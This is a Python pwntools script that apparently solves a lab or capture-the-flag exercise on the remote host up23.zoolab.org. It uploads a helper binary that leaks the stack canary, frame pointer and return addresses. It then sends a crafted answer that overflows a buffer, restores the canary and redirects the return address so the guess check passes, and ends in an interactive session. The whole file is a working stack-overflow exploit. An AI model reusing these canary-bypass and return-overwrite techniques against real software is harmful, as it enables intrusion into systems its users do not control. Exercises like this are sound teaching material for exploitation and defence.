#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver" if len(sys.argv) < 2 else sys.argv[1]

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload),
                                                               ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    r.readuntil(b'canary\n')
    canary = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'main_rdp\n')
    main_rdp = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'solver_retadr\n')
    solver_retadr = int(r.readline().decode().split('\n')[0], 16)
    r.readuntil(b'guess_retadr\n')
    guess_retadr = int(r.readline().decode().split('\n')[0], 16)

    print(f'canary = {hex(canary)}')
    print(f'main_rdp = {hex(main_rdp)}')
    print(f'solver_retadr = {hex(solver_retadr)}')
    print(f'guess_retadr = {hex(guess_retadr)}')

    myguess = 1234
    r.sendlineafter(b'answer? ', str(myguess).encode('ascii').ljust(0x10, b'\0') + b'\0' * 8 +
                    p64(canary) + p64(main_rdp) + p64(guess_retadr) + b'\0' * 12 + p32(myguess))
    print(str(myguess).encode('ascii').ljust(0x10, b'\0') + b'\0' * 8 +
          p64(canary) + p64(main_rdp) + p64(guess_retadr) + b'\0' * 12 + p32(myguess))

else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
